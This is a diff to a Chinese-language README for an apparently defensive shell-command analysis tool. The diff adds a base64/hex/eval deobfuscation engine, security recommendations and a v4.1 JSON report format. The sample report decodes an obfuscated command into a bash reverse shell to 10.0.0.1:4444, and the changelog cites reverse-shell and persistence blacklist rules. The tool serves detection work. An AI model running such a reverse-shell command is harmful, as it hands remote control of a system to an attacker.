@@ -151,36 +151,62 @@ v4 新增多维度交叉关联，识别组合攻击模式:
 - **Command and Control**: T1071 (Web/DNS Protocol), T1105 (Tool Transfer)
 - **Impact**: T1496 (Cryptomining)
 
-## 报告格式 (v4)
+## 命令去混淆引擎
+
+v4.1 新增多层去混淆引擎，在静态分析前自动还原混淆命令:
+
+| 层 | 类型 | 示例 |
+|----|------|------|
+| 1 | base64 解码 | `echo 'YmFzaC...' \| base64 -d` -> `bash -i >& ...` |
+| 2 | hex 解码 | `\x62\x61\x73\x68` -> `bash` |
+| 3 | eval/exec 展开 | `eval "$(...)"` -> 内层命令 |
+| 4 | $'...' 解码 | `$'\x62\x61\x73\x68'` -> `bash` |
+
+去混淆后的命令会被同步进行恶意模式匹配，有效对抗编码逃避。
+
+## 安全建议引擎
+
+根据分析结果自动生成可操作的安全建议:
+
+| 判定 | 建议 |
+|------|------|
+| `DANGEROUS` | BLOCK + 具体修复步骤 (检查 crontab/passwd/authorized_keys 等) |
+| `SUSPICIOUS` | REVIEW + 人工审核 + 置信度说明 |
+| `LOW_RISK` | ALLOW + 记录审计日志 |
+| `LIKELY_SAFE` | ALLOW + 放行 |
+
+## 报告格式 (v4.1)
 
 ```json
 {
-  "version": "4.0",
+  "version": "4.1",
   "command": "...",
   "verdict": "DANGEROUS",
   "risk_score": 75,
   "confidence": "HIGH",
+  "recommendations": [
+    "BLOCK: 强烈建议阻止此命令执行",
+    "检查 crontab -l、/etc/cron.d/、systemd services 是否被篡改"
+  ],
   "is_legitimate_pattern": false,
   "findings_summary": {
-    "total": 5,
-    "critical": 3,
-    "warn": 2,
-    "info": 0,
-    "dimensions_hit": 4
+    "total": 5, "critical": 3, "warn": 2, "info": 0, "dimensions_hit": 4
   },
-  "findings": [
-    {
-      "severity": "CRITICAL",
-      "dimension": "攻击链",
-      "description": "检测到恶意软件部署链",
-      "risk_score": 15,
-      "mitre_attack": [{"id": "T1105", "name": "..."}],
-      "evidence": "..."
-    }
+  "findings": [...],
+  "deobfuscation": {
+    "original": "echo 'YmFz...' | base64 -d | bash",
+    "deobfuscated": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "layers": [{"type": "base64", "decoded": "bash -i >& ..."}]
+  },
+  "timeline": [
+    {"phase": "baseline", "time": "...", "desc": "基线采集完成"},
+    {"phase": "probes_start", "time": "...", "desc": "探针启动"},
+    {"phase": "exec_end", "time": "...", "desc": "命令执行结束"},
+    {"phase": "post_snapshot", "time": "...", "desc": "分析完成"}
   ],
-  "mitre_attack": {"T1546.004": {"name": "...", "findings": ["..."]}},
+  "mitre_attack": {...},
   "mitre_tactics": {
-    "Persistence": ["T1053.003", "T1546.004"],
+    "Persistence": ["T1053.003"],
     "Defense Evasion": ["T1070.003"]
   },
   "dimensions": { ... }
@@ -202,8 +228,16 @@ echo '{"id": "b31", "label": "malicious", "desc": "my test", "command": "..."}' 
 ./run_all.sh white:w31
 ```
 
-## v3 -> v4 变更
+## v3 -> v4 变更日志
 
+### v4.1
+- 新增: 命令去混淆引擎 (base64/hex/eval/$'' 四层解码)
+- 新增: 安全建议引擎 (可操作的修复建议)
+- 新增: 执行时间线 (baseline -> probes -> exec -> analysis)
+- 增强: 反逃逸黑名单 (30+ 规则, 覆盖 PAM/systemd/init.d/firewall/reverse shell)
+- 报告格式: v4.0 -> v4.1 (新增 recommendations/deobfuscation/timeline)
+
+### v4.0
 - 检测维度: 19 -> 23 (新增: 计划任务差异/隐藏进程/信号处理/攻击链关联)
 - 恶意模式: 50+ -> 70+ (新增: LotL/进程伪装/时间戳篡改/编译后门/网络隧道)
 - 合法白名单: 12 -> 30+ (新增: docker/go/make/terraform/ansible 等)
